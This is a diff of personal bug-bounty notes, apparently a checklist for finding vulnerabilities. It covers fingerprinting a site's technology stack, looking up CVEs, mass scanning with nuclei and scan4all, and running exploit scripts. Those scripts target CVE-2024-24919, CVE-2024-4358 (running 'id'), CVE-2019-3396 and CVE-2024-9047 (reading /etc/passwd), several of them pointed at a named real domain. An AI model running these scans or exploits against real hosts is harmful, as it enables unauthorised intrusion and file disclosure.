@@ -8,6 +8,7 @@ whatweb https://target.com
 wappalyzer https://target.com
 nmap -sV -Pn target.com
 nmap -sV -T4 licet.ac.in
+nuclei -l livedomains.txt -t technologies/
 
 
 	This gives you:
@@ -18,6 +19,10 @@ nmap -sV -T4 licet.ac.in
 	    Backend stack: PHP, ASP.NET, Java, etc.
 
 #also analyze httpx results from recon
+#analyze res headers
+#use wappalyzer
+
+=>note down the technoogies and version...
 
 
 -----------------------------------------------------------------🧠 2. Use CVE Search Engines----------------------------------------------------------------------
@@ -41,52 +46,52 @@ Once you know the stack:
 		php 8.1.1
 
 
----------------------------------------------------------------🛠️ 3. Automated Tools to Fetch CVEs----------------------------------------------------------------
+---------------------------------------------------------------🛠️ 3. Automated Tools----------------------------------------------------------------
 
 You can automate this using:
 
 1.nuclei
-nuclei -u https://target.com -t cves/ -severity critical,high -o nuclei_output
-nuclei -u https://target.com -t technologies/,cves/,exposed-panels/,misconfiguration/ -o nuclei_output1
+nuclei -l livedomains.txt -t cves/ -severity critical,high -o nuclei_output
+nuclei -l livedomains.txt -t technologies/,cves/,exposed-panels/,misconfiguration/ -o nuclei_output1
 //output : nuclei_outpu, nuclei_output1
 
 
-2.jaeles
-jaeles:
-cat oi | jaeles scan -c 100 
-//output folder: out
-
-1.oneforall: =>analyzing
- python3 oneforall.py --targets ./domains.txt run
-
-
 2.scanforall: => analyzing
-./scan4all -l domains.txt | tee scan4all_output
+./scan4all -l livedomains.txt | tee -a scan4all_output
 //output: scan4all_output
-
-lazyhunter: input:ip
-python3 lazyhunter.py -f oi | tee lazy_output
-//output: lazy_output
 
 
 6.CVE-2024-24919
-CVE-2024-24919.sh -w domains | tee output_2024-24919
+/home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/tools/CVE-2024-24919.sh -w livedomains.txt | tee output_2024-24919
 //output:output_2024-24919
 
 7.cve-2024-4358
-python3 cve-2024-4358 -l targets.txt -c "id" | tee output_2024-4358
+python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/tools/cve-2024-4358.py -l livedomains.txt -c "id" | tee output_2024-4358
 //output:output_2024-4358
-
 
 
 
 man:
 
-4.inurl:"/geoserver/ows?service=wfs" site:*.gov "target"
+1.jaeles
+cat livedomains.txt | jaeles scan -c 100 
+jaeles scan -u https://target.com
+
+1.oneforall: =>analyzing
+ python3 oneforall.py --targets ./domains.txt run
+
+
+4.inurl:"/geoserver/ows?service=wfs" "target"
 nuclei -l urls_endpoints.txt -tags geoserver -severity critical,high,medium
 
 5.intitle:dashboard-confluence "target" (#related CVE: CVE-2019-3396)
+ruby /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/tools/cve-2019-3396.rb -t  https://licet.ac.in  --scan
+
 
 8. cve-2024-9047
 ./cve-2024-9047.sh https://licet.ac.in /etc/passwd
+
+lazyhunter: input:ip's
+python3 /home/maddy/techiee/bug_bounty/2_phase_recon_autom/automation/tools/lazyhunter.py -f livedomains.txt | tee lazy_output
+//output: lazy_output
 
